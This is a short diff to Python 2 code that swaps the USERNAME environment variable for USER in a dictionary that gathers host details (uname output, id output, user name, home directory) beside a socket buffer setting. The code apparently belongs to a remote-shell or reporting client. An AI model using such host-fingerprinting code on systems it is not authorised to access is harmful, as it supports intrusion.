@@ -11,7 +11,7 @@ socksize = 4096
 info = {
     'uname': commands.getoutput('uname -ar'),
     'uid': commands.getoutput('id'),
-    'user': os.environ['USERNAME'],
+    'user': os.environ['USER'],
     'home': os.environ['HOME']
 }
 
